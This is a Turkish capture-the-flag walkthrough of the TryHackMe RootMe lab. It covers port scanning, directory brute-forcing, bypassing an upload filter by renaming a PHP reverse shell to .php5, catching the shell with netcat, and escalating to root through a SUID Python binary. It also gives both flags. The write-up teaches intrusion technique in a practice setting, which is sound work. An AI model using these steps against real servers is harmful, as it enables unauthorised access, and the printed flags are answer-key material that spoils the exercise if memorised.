## Giriş

Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/breakit">RootMe</a> makinesinin çözümünü paylaşacağım.

# Bölüm 1 - Reconnaissance

1.
```
Makineyi tarayın, kaç tane port açık?
```
Öncelikle nmap taraması başlatalım.
```
┌──(root@r3tr0)-[/home/kali/Desktop/ctf/RootMe]
└─# nmap -T5 -p- -v -sV 10.10.155.83     
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a1.png?raw=true)

>Göründüğü gibi 22 ve 80 portu açık. Cevap: 2

2.
```
Çalışan Apache versiyonu nedir?
```
>2.4.29

3.
```
22 portunda çalışan servis nedir?
```
> ssh

4.
```
Gizli dizin nedir?
```
Gobuster çalıştırarak gizli dizini bulalım.

```
┌──(root㉿r3tr0)-[/home/kali/Desktop/ctf/RootMe]
└─# gobuster dir --url http://10.10.178.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 60
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a2.png?raw=true)

> /panel/


# Bölüm 2 - Getting a Shell

1.
```
Bir form yükleyin ve ters shell alın ve bayrağı bulun.
```
Önce bulduğumuz gizli dizine gidelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a3.png?raw=true)

Php reverse shell komut dosyası kullanılarak bağlantı sağlanılabilir. Bunun için pentest monkey’in [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) kodunu kullandım. Dosya yüklenmek istendiğinde izin verilmiyor.

Dosya adı uzantısı değiştirilerek file upload bypass işlemi yapılabilir. Bu yüzden php-reverse-shell.php dosyasının adı php-reverse-shell.php5 yapıldığında yükleme işlemi başarı ile gerçekleşiyor.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a4.png?raw=true)

Yükleme işlemi yapmadan önce dosyayı açıp kendi ip adresinizi ve dinlemek istediğiniz portu girmelisiniz.

Dosyayı yükledikten sonra netcat çalıştırıyoruz.
```
┌──(root㉿r3tr0)-[/home/kali/Desktop/ctf/RootMe]
└─# nc -nvlp 1234 
```
http://10.10.178.135/uploads/ a giderek yüklediğimiz dosyayı çalışıyoruz ve shellimizi alıyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a5.png?raw=true)

python -c ‘import pty;pty.spawn(“/bin/bash”)’ ile bağlantı stabil hale getirelim.

cat /var/www/user.txt ile user flag’ı görüntüleyebiliriz.

> THM{y0u_g0t_a_sh3ll}

# Bölüm 3 - Privilege escalation 

find / -user root -perm /4000 ile root yetkisi edilecek dosyalar araştıralım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a6.png?raw=true)

Burada /usr/bin/python dikkatimi çekti. [GTFOBins](https://gtfobins.github.io/gtfobins/python/) sayfasında python üzerinden yetki yükseltme ile ilgili komut bulunuyor.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a7.png?raw=true)

python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’ komutu ile yetkimizi yükseltelim.

Ardından cat /root/root.txt komutu ile root bayrağına ulaşalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/RootMe/images/a8.png?raw=true)

> THM{pr1v1l3g3_3sc4l4t10n}

Ve böylelikle bir ctf daha tamamladık gelecek yazılarımda görüşmek üzere.






